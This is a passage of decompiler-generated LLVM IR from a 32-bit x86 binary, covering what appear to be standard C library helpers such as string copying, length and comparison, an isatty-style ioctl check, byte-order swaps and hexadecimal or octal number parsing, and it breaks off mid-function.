  store i32 %v1_804d229, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804d22a

dec_label_pc_804d22a:                             ; preds = %dec_label_pc_804d22d, %dec_label_pc_804d218
  %v3_804d22e = phi i32 [ %v4_804d225, %dec_label_pc_804d218 ], [ %v8_804d22e, %dec_label_pc_804d22d ]
  %v0_804d22a = phi i32 [ %v1_804d229, %dec_label_pc_804d218 ], [ %v0_804d22a.pre, %dec_label_pc_804d22d ]
  %v1_804d22a = add i32 %v0_804d22a, -1
  %v8_804d22a = icmp eq i32 %v1_804d22a, 0
  store i32 %v1_804d22a, i32* %ecx.global-to-local, align 4
  br i1 %v8_804d22a, label %.loopexit, label %dec_label_pc_804d22d

dec_label_pc_804d22d:                             ; preds = %dec_label_pc_804d22a
  %v0_804d22d = load i32, i32* %esi.global-to-local, align 4
  %v1_804d22d = inttoptr i32 %v0_804d22d to i8*
  %v2_804d22d = load i8, i8* %v1_804d22d, align 1
  %v10_804d22d = load i1, i1* @df, align 1
  %v11_804d22d = select i1 %v10_804d22d, i32 -1, i32 1
  %v12_804d22d = add i32 %v11_804d22d, %v0_804d22d
  store i32 %v12_804d22d, i32* %esi.global-to-local, align 4
  %v4_804d22e = inttoptr i32 %v3_804d22e to i8*
  store i8 %v2_804d22d, i8* %v4_804d22e, align 1
  %v5_804d22e = load i32, i32* %edi.global-to-local, align 4
  %v6_804d22e = load i1, i1* @df, align 1
  %v7_804d22e = select i1 %v6_804d22e, i32 -1, i32 1
  %v8_804d22e = add i32 %v7_804d22e, %v5_804d22e
  store i32 %v8_804d22e, i32* %edi.global-to-local, align 4
  %v6_804d22f = icmp eq i8 %v2_804d22d, 0
  %v1_804d231 = icmp eq i1 %v6_804d22f, false
  %v0_804d22a.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804d231, label %dec_label_pc_804d22a, label %dec_label_pc_804d233

dec_label_pc_804d233:                             ; preds = %dec_label_pc_804d22d
  %v1_804d233 = add i32 %v0_804d22a.pre, -1
  store i32 %v1_804d233, i32* %ecx.global-to-local, align 4
  %v2_804d234 = sext i8 %v2_804d22d to i32
  %v4_804d234 = inttoptr i32 %v8_804d22e to i8*
  %v5_804d234 = call i8* @_memset(i8* %v4_804d234, i32 %v2_804d234, i32 %v1_804d233)
  %v6_804d234 = ptrtoint i8* %v5_804d234 to i32
  store i32 %v6_804d234, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804d22a, %dec_label_pc_804d233
  %v2_804d23a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d23a, i32* @edx, align 4
  %v2_804d23b = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d23b, i32* @esi, align 4
  ret i32 %v4_804d225

; uselistorder directives
  uselistorder i32 %v8_804d22e, { 0, 2, 1 }
  uselistorder i8 %v2_804d22d, { 0, 2, 1 }
  uselistorder i32 %v1_804d22a, { 1, 0 }
  uselistorder i32 %v4_804d225, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @function_804d240() local_unnamed_addr {
dec_label_pc_804d240:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_1()
  %v4_804d240 = ptrtoint i8* %tmp4 to i32
  %v8_804d2535 = icmp eq i32 %tmp, 0
  %v1_804d2547 = icmp eq i1 %v8_804d2535, false
  br i1 %v1_804d2547, label %dec_label_pc_804d24d, label %dec_label_pc_804d256

dec_label_pc_804d24d:                             ; preds = %dec_label_pc_804d240, %dec_label_pc_804d252
  %v1_804d2539 = phi i32 [ %v1_804d253, %dec_label_pc_804d252 ], [ %tmp, %dec_label_pc_804d240 ]
  %v0_804d2568 = phi i32 [ %v1_804d252, %dec_label_pc_804d252 ], [ %v4_804d240, %dec_label_pc_804d240 ]
  %v1_804d24d = inttoptr i32 %v0_804d2568 to i8*
  %v2_804d24d = load i8, i8* %v1_804d24d, align 1
  %v3_804d24d = icmp eq i8 %v2_804d24d, 0
  br i1 %v3_804d24d, label %dec_label_pc_804d256, label %dec_label_pc_804d252

dec_label_pc_804d252:                             ; preds = %dec_label_pc_804d24d
  %v1_804d252 = add i32 %v0_804d2568, 1
  %v1_804d253 = add i32 %v1_804d2539, -1
  %v8_804d253 = icmp eq i32 %v1_804d253, 0
  %v1_804d254 = icmp eq i1 %v8_804d253, false
  br i1 %v1_804d254, label %dec_label_pc_804d24d, label %dec_label_pc_804d256

dec_label_pc_804d256:                             ; preds = %dec_label_pc_804d252, %dec_label_pc_804d24d, %dec_label_pc_804d240
  %v0_804d256.lcssa = phi i32 [ %v4_804d240, %dec_label_pc_804d240 ], [ %v0_804d2568, %dec_label_pc_804d24d ], [ %v1_804d252, %dec_label_pc_804d252 ]
  %v2_804d256 = sub i32 %v0_804d256.lcssa, %v4_804d240
  ret i32 %v2_804d256

; uselistorder directives
  uselistorder i32 %v1_804d253, { 1, 0 }
  uselistorder i32 %v0_804d2568, { 0, 2, 1 }
  uselistorder i32 %v4_804d240, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d24d, { 1, 0 }
}

define i32 @function_804d25c() local_unnamed_addr {
dec_label_pc_804d25c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_804d26d = call i32 @function_804d27c(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_804d275 = load i32, i32* @ebx, align 4
  ret i32 %v0_804d275
}

define i32 @function_804d27c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d27c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804d28e = icmp ugt i32 %arg1, 124
  br i1 %v6_804d28e, label %dec_label_pc_804d2ab, label %dec_label_pc_804d290

dec_label_pc_804d290:                             ; preds = %dec_label_pc_804d27c
  store i32 ptrtoint ([8 x i8]* @global_var_80534a0.131 to i32), i32* @esi, align 4
  %v1_804d2a04 = icmp eq i32 %arg1, 0
  %v1_804d2a211 = icmp eq i1 %v1_804d2a04, false
  br i1 %v1_804d2a211, label %dec_label_pc_804d299, label %dec_label_pc_804d2a4

dec_label_pc_804d299:                             ; preds = %dec_label_pc_804d290, %dec_label_pc_804d299
  %v0_804d29c = phi i32 [ %v3_804d29c, %dec_label_pc_804d299 ], [ %arg1, %dec_label_pc_804d290 ]
  %v0_804d29f = phi i32 [ %v1_804d29f, %dec_label_pc_804d299 ], [ ptrtoint ([8 x i8]* @global_var_80534a0.131 to i32), %dec_label_pc_804d290 ]
  %v1_804d299 = inttoptr i32 %v0_804d29f to i8*
  %v2_804d299 = load i8, i8* %v1_804d299, align 1
  %v7_804d299 = icmp eq i8 %v2_804d299, 0
  %v2_804d29c = zext i1 %v7_804d299 to i32
  %v3_804d29c = add i32 %v2_804d29c, %v0_804d29c
  %v16_804d29c = icmp eq i32 %v3_804d29c, 0
  %v1_804d29f = add i32 %v0_804d29f, 1
  store i32 %v1_804d29f, i32* @esi, align 4
  %v1_804d2a2 = icmp eq i1 %v16_804d29c, false
  br i1 %v1_804d2a2, label %dec_label_pc_804d299, label %dec_label_pc_804d2a4

dec_label_pc_804d2a4:                             ; preds = %dec_label_pc_804d299, %dec_label_pc_804d290
  %v0_804d2a6 = phi i32 [ ptrtoint ([8 x i8]* @global_var_80534a0.131 to i32), %dec_label_pc_804d290 ], [ %v1_804d29f, %dec_label_pc_804d299 ]
  store i32 0, i32* @ebp, align 4
  %v1_804d2a6 = inttoptr i32 %v0_804d2a6 to i8*
  %v2_804d2a6 = load i8, i8* %v1_804d2a6, align 1
  %v3_804d2a6 = icmp eq i8 %v2_804d2a6, 0
  %v1_804d2a9 = icmp eq i1 %v3_804d2a6, false
  br i1 %v1_804d2a9, label %dec_label_pc_804d2a4.dec_label_pc_804d2da_crit_edge, label %dec_label_pc_804d2ab

dec_label_pc_804d2a4.dec_label_pc_804d2da_crit_edge: ; preds = %dec_label_pc_804d2a4
  br label %dec_label_pc_804d2da

dec_label_pc_804d2ab:                             ; preds = %dec_label_pc_804d2a4, %dec_label_pc_804d27c
  %v1_804d2ae = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  store i32 22, i32* @ebp, align 4
  %v6_804d2bf = bitcast i32* %stack_var_-17 to i8*
  %v7_804d2bf = call i32 @function_804fc00(i8* %v6_804d2bf, i32 %arg1, i32 %v1_804d2ae, i32 -10, i32 0)
  %v1_804d2ce = add i32 %v7_804d2bf, -14
  store i32 %v1_804d2ce, i32* @esi, align 4
  %v5_804d2d1 = inttoptr i32 %v1_804d2ce to i8*
  store i8* %v5_804d2d1, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804d2ce to i16*
  %v6_804d2d2 = call i32 @function_804d1a8(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8053482.132 to i32), i32 14)
  %v1_804d2e4.pre = load i32, i32* @edi, align 4
  %v0_804d2ea.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d2da

dec_label_pc_804d2da:                             ; preds = %dec_label_pc_804d2a4.dec_label_pc_804d2da_crit_edge, %dec_label_pc_804d2ab
  %v0_804d2ea = phi i32 [ %v0_804d2a6, %dec_label_pc_804d2a4.dec_label_pc_804d2da_crit_edge ], [ %v0_804d2ea.pre, %dec_label_pc_804d2ab ]
  %v1_804d2e4 = phi i32 [ %arg3, %dec_label_pc_804d2a4.dec_label_pc_804d2da_crit_edge ], [ %v1_804d2e4.pre, %dec_label_pc_804d2ab ]
  %v4_804d2da = icmp eq i32 %arg2, 0
  %v3_804d2e4 = select i1 %v4_804d2da, i32 0, i32 %v1_804d2e4
  store i32 %v3_804d2e4, i32* @edi, align 4
  %v5_804d2ea = inttoptr i32 %v0_804d2ea to i8*
  store i8* %v5_804d2ea, i8** %stack_var_-108, align 4
  %v3_804d2eb = call i32 @function_804d204(i8* %v5_804d2ea)
  %v1_804d2f3 = add i32 %v3_804d2eb, 1
  store i32 %v1_804d2f3, i32* %ebx.global-to-local, align 4
  %v1_804d2f6 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_804d2f3, %v1_804d2f6
  br i1 %tmp, label %dec_label_pc_804d2fa, label %dec_label_pc_804d301

dec_label_pc_804d2fa:                             ; preds = %dec_label_pc_804d2da
  store i32 %v1_804d2f6, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804d301

dec_label_pc_804d301:                             ; preds = %dec_label_pc_804d2da, %dec_label_pc_804d2fa
  %v0_804d306 = phi i32 [ %v1_804d2f3, %dec_label_pc_804d2da ], [ %v1_804d2f6, %dec_label_pc_804d2fa ]
  %v1_804d301 = icmp eq i32 %v0_804d306, 0
  br i1 %v1_804d301, label %dec_label_pc_804d31d, label %dec_label_pc_804d305

dec_label_pc_804d305:                             ; preds = %dec_label_pc_804d301
  %v0_804d307 = load i32, i32* @esi, align 4
  %v8_804d308 = inttoptr i32 %arg2 to i8*
  store i8* %v8_804d308, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804d30c = call i32 @function_804d1a8(i16* %tmp45, i32 %v0_804d307, i32 %v0_804d306)
  %v1_804d318 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d318 = add i32 %arg2, -1
  %v3_804d318 = add i32 %v2_804d318, %v1_804d318
  %v4_804d318 = inttoptr i32 %v3_804d318 to i8*
  store i8 0, i8* %v4_804d318, align 1
  br label %dec_label_pc_804d31d

dec_label_pc_804d31d:                             ; preds = %dec_label_pc_804d301, %dec_label_pc_804d305
  %v0_804d31d = load i32, i32* @ebp, align 4
  %v1_804d31d = icmp eq i32 %v0_804d31d, 0
  br i1 %v1_804d31d, label %dec_label_pc_804d328, label %dec_label_pc_804d321

dec_label_pc_804d321:                             ; preds = %dec_label_pc_804d31d
  %v0_804d321 = load i8*, i8** %stack_var_-108, align 4
  %v1_804d321 = ptrtoint i8* %v0_804d321 to i32
  %v2_804d321 = call i32 @function_804b7f4(i32 %v1_804d321)
  %v0_804d326 = load i32, i32* @ebp, align 4
  %v2_804d326 = inttoptr i32 %v2_804d321 to i32*
  store i32 %v0_804d326, i32* %v2_804d326, align 4
  %v0_804d32b.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804d328

dec_label_pc_804d328:                             ; preds = %dec_label_pc_804d31d, %dec_label_pc_804d321
  %v0_804d32b = phi i32 [ 0, %dec_label_pc_804d31d ], [ %v0_804d32b.pre, %dec_label_pc_804d321 ]
  ret i32 %v0_804d32b

; uselistorder directives
  uselistorder i32 %v1_804d2f6, { 1, 2, 0 }
  uselistorder i32 %v1_804d2f3, { 1, 0, 2 }
  uselistorder i32 %v1_804d29f, { 0, 2, 1 }
  uselistorder i32 %v3_804d29c, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_80534a0.131 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804d328, { 1, 0 }
  uselistorder label %dec_label_pc_804d31d, { 1, 0 }
  uselistorder label %dec_label_pc_804d301, { 1, 0 }
  uselistorder label %dec_label_pc_804d2da, { 1, 0 }
  uselistorder label %dec_label_pc_804d299, { 1, 0 }
}

define i32 @function_804d334(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d334:
  %v2_804d344 = inttoptr i32 %arg2 to i8*
  %v3_804d344 = call i32 @function_805037c(i8* %v2_804d344, i32 %arg1)
  ret i32 %v3_804d344
}

define i32 @function_804d34c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804d34c:
  %v0_804d34d = load i32, i32* bitcast (i32** @global_var_8055da8.133 to i32*), align 8
  %v4_804d356 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804d35e

dec_label_pc_804d35e:                             ; preds = %dec_label_pc_804d37b, %dec_label_pc_804d34c
  %storemerge = phi i32 [ %v4_804d356, %dec_label_pc_804d34c ], [ %v1_804d37c, %dec_label_pc_804d37b ]
  %v0_804d37c = phi i32 [ %v4_804d356, %dec_label_pc_804d34c ], [ %v1_804d37c, %dec_label_pc_804d37b ]
  %v0_804d3816 = phi i32 [ 0, %dec_label_pc_804d34c ], [ %v0_804d3817, %dec_label_pc_804d37b ]
  %v0_804d37b = phi i32 [ %arg2, %dec_label_pc_804d34c ], [ %v1_804d37b, %dec_label_pc_804d37b ]
  store i32 %storemerge, i32* @ecx, align 4
  %v12_804d35e = icmp eq i32 %v0_804d37c, %v0_804d37b
  %.pre = inttoptr i32 %v0_804d37c to i8*
  br i1 %v12_804d35e, label %dec_label_pc_804d376, label %dec_label_pc_804d362

dec_label_pc_804d362:                             ; preds = %dec_label_pc_804d35e
  %v2_804d362 = load i8, i8* %.pre, align 1
  %v3_804d362 = zext i8 %v2_804d362 to i32
  %v2_804d365 = mul nuw nsw i32 %v3_804d362, 2
  %v3_804d365 = add i32 %v2_804d365, %v0_804d34d
  %v4_804d365 = inttoptr i32 %v3_804d365 to i16*
  %v5_804d365 = load i16, i16* %v4_804d365, align 2
  %v6_804d365 = sext i16 %v5_804d365 to i32
  %v1_804d369 = inttoptr i32 %v0_804d37b to i8*
  %v2_804d369 = load i8, i8* %v1_804d369, align 1
  %v3_804d369 = zext i8 %v2_804d369 to i32
  %v2_804d36c = mul nuw nsw i32 %v3_804d369, 2
  %v3_804d36c = add i32 %v2_804d36c, %v0_804d34d
  %v4_804d36c = inttoptr i32 %v3_804d36c to i16*
  %v5_804d36c = load i16, i16* %v4_804d36c, align 2
  %v6_804d36c = sext i16 %v5_804d36c to i32
  %v2_804d370 = sub nsw i32 %v6_804d365, %v6_804d36c
  %v12_804d370 = icmp eq i32 %v2_804d370, 0
  store i32 %v2_804d370, i32* @edx, align 4
  %v1_804d374 = icmp eq i1 %v12_804d370, false
  br i1 %v1_804d374, label %dec_label_pc_804d37f, label %dec_label_pc_804d376

dec_label_pc_804d376:                             ; preds = %dec_label_pc_804d35e, %dec_label_pc_804d362
  %v0_804d3817 = phi i32 [ %v2_804d370, %dec_label_pc_804d362 ], [ %v0_804d3816, %dec_label_pc_804d35e ]
  %v2_804d376 = load i8, i8* %.pre, align 1
  %v3_804d376 = icmp eq i8 %v2_804d376, 0
  br i1 %v3_804d376, label %dec_label_pc_804d37f, label %dec_label_pc_804d37b

dec_label_pc_804d37b:                             ; preds = %dec_label_pc_804d376
  %v1_804d37b = add i32 %v0_804d37b, 1
  %v1_804d37c = add i32 %v0_804d37c, 1
  br label %dec_label_pc_804d35e

dec_label_pc_804d37f:                             ; preds = %dec_label_pc_804d376, %dec_label_pc_804d362
  %v0_804d381 = phi i32 [ %v0_804d3817, %dec_label_pc_804d376 ], [ %v2_804d370, %dec_label_pc_804d362 ]
  ret i32 %v0_804d381

; uselistorder directives
  uselistorder i32 %v1_804d37c, { 1, 0 }
  uselistorder i32 %v0_804d3817, { 1, 0 }
  uselistorder i32 %v2_804d370, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804d37b, { 1, 2, 0 }
  uselistorder i32 %v0_804d37c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d376, { 1, 0 }
}

define i32 @function_804d384(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d384:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804d384 = load i32, i32* @edi, align 4
  %v0_804d385 = load i32, i32* @esi, align 4
  %v0_804d386 = load i32, i32* @ebx, align 4
  store i32 %v0_804d386, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804d38f = inttoptr i32 %arg1 to i8*
  %v2_804d38f = call i32 @function_804d204(i8* %v1_804d38f)
  %v1_804d394 = add i32 %v2_804d38f, 1
  store i32 %v1_804d394, i32* @esi, align 4
  %v1_804d39a = call i32 @function_804daaa(i32 %v1_804d394)
  %v1_804d3a2 = icmp eq i32 %v1_804d39a, 0
  store i32 %v1_804d39a, i32* %ebx.global-to-local, align 4
  br i1 %v1_804d3a2, label %dec_label_pc_804d3b4, label %dec_label_pc_804d3a8

dec_label_pc_804d3a8:                             ; preds = %dec_label_pc_804d384
  %v0_804d3a9 = load i32, i32* @esi, align 4
  %v0_804d3aa = load i32, i32* @edi, align 4
  %v3_804d3ac = inttoptr i32 %v1_804d39a to i16*
  %v4_804d3ac = call i32 @function_804d1a8(i16* %v3_804d3ac, i32 %v0_804d3aa, i32 %v0_804d3a9)
  %v0_804d3b4.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d3b4

dec_label_pc_804d3b4:                             ; preds = %dec_label_pc_804d384, %dec_label_pc_804d3a8
  %v0_804d3b4 = phi i32 [ 0, %dec_label_pc_804d384 ], [ %v0_804d3b4.pre, %dec_label_pc_804d3a8 ]
  %v2_804d3b6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d3b6, i32* @ebx, align 4
  store i32 %v0_804d385, i32* @esi, align 4
  store i32 %v0_804d384, i32* @edi, align 4
  ret i32 %v0_804d3b4

; uselistorder directives
  uselistorder label %dec_label_pc_804d3b4, { 1, 0 }
}

define i32 @function_804d3d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d3d8:
  %stack_var_-60 = alloca i32, align 4
  %v3_804d3e4 = call i32 @function_804d3f8(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804d3e9 = icmp eq i32 %v3_804d3e4, 0
  %v1_804d3eb = zext i1 %v1_804d3e9 to i32
  ret i32 %v1_804d3eb
}

define i32 @function_804d3f8(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_804d3f8:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_5()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d3f8 = load i32, i32* @esi, align 4
  %v0_804d3f9 = load i32, i32* @ebx, align 4
  store i32 %v0_804d3f9, i32* %stack_var_-8, align 4
  %v2_804d3fd = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804d3fd, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804d40f = call i32 @function_804b69c(i32 %arg1, i32 21505, i32 %v2_804d3fd)
  store i32 %v3_804d40f, i32* %eax.global-to-local, align 4
  %v1_804d417 = icmp eq i32 %v3_804d40f, 0
  store i32 %v3_804d40f, i32* @esi, align 4
  %v1_804d41b = icmp eq i1 %v1_804d417, false
  br i1 %v1_804d41b, label %dec_label_pc_804d460, label %dec_label_pc_804d41d

dec_label_pc_804d41d:                             ; preds = %dec_label_pc_804d3f8
  %v3_804d41d = load i32, i32* %stack_var_-44, align 4
  %v1_804d421 = load i32, i32* @ebx, align 4
  %v2_804d421 = inttoptr i32 %v1_804d421 to i32*
  store i32 %v3_804d41d, i32* %v2_804d421, align 4
  %v1_804d427 = load i32, i32* @ebx, align 4
  %v2_804d427 = add i32 %v1_804d427, 4
  %v3_804d427 = inttoptr i32 %v2_804d427 to i32*
  %v1_804d42e = load i32, i32* @ebx, align 4
  %v2_804d42e = add i32 %v1_804d42e, 8
  %v3_804d42e = inttoptr i32 %v2_804d42e to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804d435 = load i32, i32* @ebx, align 4
  %v2_804d435 = add i32 %v1_804d435, 12
  %v3_804d435 = inttoptr i32 %v2_804d435 to i32*
  store i32 %tmp3, i32* %v3_804d435, align 4
  %v4_804d438 = zext i8 %tmp to i32
  %v5_804d438 = load i32, i32* %eax.global-to-local, align 4
  %v6_804d438 = and i32 %v5_804d438, -256
  %v7_804d438 = or i32 %v6_804d438, %v4_804d438
  store i32 %v7_804d438, i32* %eax.global-to-local, align 4
  %v2_804d43c = load i32, i32* @ebx, align 4
  %v3_804d43c = add i32 %v2_804d43c, 16
  %v4_804d43c = inttoptr i32 %v3_804d43c to i8*
  store i8 %tmp, i8* %v4_804d43c, align 1
  %v0_804d43f = load i32, i32* %eax.global-to-local, align 4
  %v2_804d442 = ptrtoint i32* %stack_var_-27 to i32
  %v0_804d447 = load i32, i32* @ebx, align 4
  %v1_804d447 = add i32 %v0_804d447, 17
  store i32 %v1_804d447, i32* %eax.global-to-local, align 4
  %v4_804d44b = call i32 @function_80503a4(i32 %v1_804d447, i32 %v2_804d442, i32 19, i32 %v0_804d43f)
  store i32 %v4_804d44b, i32* %eax.global-to-local, align 4
  %v3_804d458 = inttoptr i32 %v4_804d44b to i8*
  %v4_804d458 = call i32 @function_804d1d0(i8* %v3_804d458, i32 0, i32 13)
  store i32 %v4_804d458, i32* %eax.global-to-local, align 4
  %v0_804d463.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d460

dec_label_pc_804d460:                             ; preds = %dec_label_pc_804d3f8, %dec_label_pc_804d41d
  %v0_804d463 = phi i32 [ %v3_804d40f, %dec_label_pc_804d3f8 ], [ %v0_804d463.pre, %dec_label_pc_804d41d ]
  store i32 %v0_804d463, i32* %eax.global-to-local, align 4
  %v2_804d465 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d465, i32* @ebx, align 4
  store i32 %v0_804d3f8, i32* @esi, align 4
  ret i32 %v0_804d463

; uselistorder directives
  uselistorder i32 %v0_804d463, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_804d460, { 1, 0 }
}

define i32 @function_804d468(i16 %arg1) local_unnamed_addr {
dec_label_pc_804d468:
  %v3_804d46d = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_804d46d = zext i16 %v3_804d46d to i32
  ret i32 %v4_804d46d
}

define i32 @function_804d475(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d475:
  %v1_804d479 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804d479
}

define i32 @function_804d489(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d489:
  %v1_804d48d = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804d48d
}

define i32 @function_804d490(i8* %arg1) local_unnamed_addr {
dec_label_pc_804d490:
  %v4_804d497 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804d4aa

dec_label_pc_804d4aa:                             ; preds = %dec_label_pc_804d552, %dec_label_pc_804d490
  %v3_804d53b = phi i32 [ 0, %dec_label_pc_804d490 ], [ %v5_804d540, %dec_label_pc_804d552 ]
  %v2_804d549 = phi i32 [ 0, %dec_label_pc_804d490 ], [ %v3_804d549, %dec_label_pc_804d552 ]
  %v0_804d4b8 = phi i32 [ %v4_804d497, %dec_label_pc_804d490 ], [ %v1_804d552, %dec_label_pc_804d552 ]
  %v1_804d4aa = inttoptr i32 %v0_804d4b8 to i8*
  %v2_804d4aa = load i8, i8* %v1_804d4aa, align 1
  %v8_804d4aa = icmp eq i8 %v2_804d4aa, 48
  br i1 %v8_804d4aa, label %dec_label_pc_804d4b8, label %dec_label_pc_804d4af

dec_label_pc_804d4af:                             ; preds = %dec_label_pc_804d4aa
  br label %dec_label_pc_804d4d7

dec_label_pc_804d4b8:                             ; preds = %dec_label_pc_804d4aa
  %v1_804d4b8 = add i32 %v0_804d4b8, 1
  %v1_804d4b9 = inttoptr i32 %v1_804d4b8 to i8*
  %v2_804d4b9 = load i8, i8* %v1_804d4b9, align 1
  %v3_804d4b9 = zext i8 %v2_804d4b9 to i32
  %v4_804d4b9 = load i32, i32* @eax, align 4
  %v5_804d4b9 = and i32 %v4_804d4b9, -256
  %v6_804d4b9 = or i32 %v5_804d4b9, %v3_804d4b9
  store i32 %v6_804d4b9, i32* @eax, align 4
  %v10_804d4bb = icmp eq i8 %v2_804d4b9, 120
  br i1 %v10_804d4bb, label %dec_label_pc_804d4cf, label %dec_label_pc_804d4bf

dec_label_pc_804d4bf:                             ; preds = %dec_label_pc_804d4b8
  %v10_804d4bf = icmp eq i8 %v2_804d4b9, 88
  br i1 %v10_804d4bf, label %dec_label_pc_804d4cf, label %dec_label_pc_804d4c3

dec_label_pc_804d4c3:                             ; preds = %dec_label_pc_804d4bf
  br label %dec_label_pc_804d4d7

dec_label_pc_804d4cf:                             ; preds = %dec_label_pc_804d4bf, %dec_label_pc_804d4b8
  %v1_804d4cf = add i32 %v0_804d4b8, 2
  br label %dec_label_pc_804d4d7

dec_label_pc_804d4d7:                             ; preds = %dec_label_pc_804d4c3, %dec_label_pc_804d4af, %dec_label_pc_804d4cf
  %v0_804d52b4 = phi i32 [ %v1_804d4b8, %dec_label_pc_804d4c3 ], [ %v0_804d4b8, %dec_label_pc_804d4af ], [ %v1_804d4cf, %dec_label_pc_804d4cf ]
  %v0_804d53113 = phi i32 [ 1, %dec_label_pc_804d4c3 ], [ 0, %dec_label_pc_804d4af ], [ 0, %dec_label_pc_804d4cf ]
  %v0_804d50010 = phi i32 [ 8, %dec_label_pc_804d4c3 ], [ 10, %dec_label_pc_804d4af ], [ 16, %dec_label_pc_804d4cf ]
  %v4_804d52b.pre = load i32, i32* @edx, align 4
  %v1_804d52b40 = inttoptr i32 %v0_804d52b4 to i8*
  %v2_804d52b41 = load i8, i8* %v1_804d52b40, align 1
  %v3_804d52b42 = zext i8 %v2_804d52b41 to i32
  %v5_804d52b43 = and i32 %v4_804d52b.pre, -256
  %v6_804d52b44 = or i32 %v3_804d52b42, %v5_804d52b43
  store i32 %v6_804d52b44, i32* @edx, align 4
  %v4_804d52d45 = icmp eq i8 %v2_804d52b41, 0
  %v1_804d52f47 = icmp eq i1 %v4_804d52d45, false
  br i1 %v1_804d52f47, label %dec_label_pc_804d4db.lr.ph, label %dec_label_pc_804d531

dec_label_pc_804d4db.lr.ph:                       ; preds = %dec_label_pc_804d4d7
  %v6_804d500 = icmp eq i32 %v0_804d50010, 16
  %v1_804d503 = icmp eq i1 %v6_804d500, false
  %v9_804d4eb = icmp eq i32 %v0_804d50010, 8
  %v1_804d4ee = icmp eq i1 %v9_804d4eb, false
  br label %dec_label_pc_804d4db

dec_label_pc_804d4db:                             ; preds = %dec_label_pc_804d4db.lr.ph, %dec_label_pc_804d525
  %v6_804d52b53 = phi i32 [ %v6_804d52b44, %dec_label_pc_804d4db.lr.ph ], [ %v6_804d52b, %dec_label_pc_804d525 ]
  %v3_804d52b52 = phi i32 [ %v3_804d52b42, %dec_label_pc_804d4db.lr.ph ], [ %v3_804d52b, %dec_label_pc_804d525 ]
  %v2_804d52b51 = phi i8 [ %v2_804d52b41, %dec_label_pc_804d4db.lr.ph ], [ %v2_804d52b, %dec_label_pc_804d525 ]
  %v0_804d55250 = phi i32 [ %v0_804d52b4, %dec_label_pc_804d4db.lr.ph ], [ %v1_804d525, %dec_label_pc_804d525 ]
  %v4_804d54049 = phi i32 [ 0, %dec_label_pc_804d4db.lr.ph ], [ %storemerge, %dec_label_pc_804d525 ]
  %v0_804d53148 = phi i32 [ %v0_804d53113, %dec_label_pc_804d4db.lr.ph ], [ 1, %dec_label_pc_804d525 ]
  %v0_804d4db = load i32, i32* @global_var_8055da0, align 32
  %v2_804d4e3 = mul nuw nsw i32 %v3_804d52b52, 2
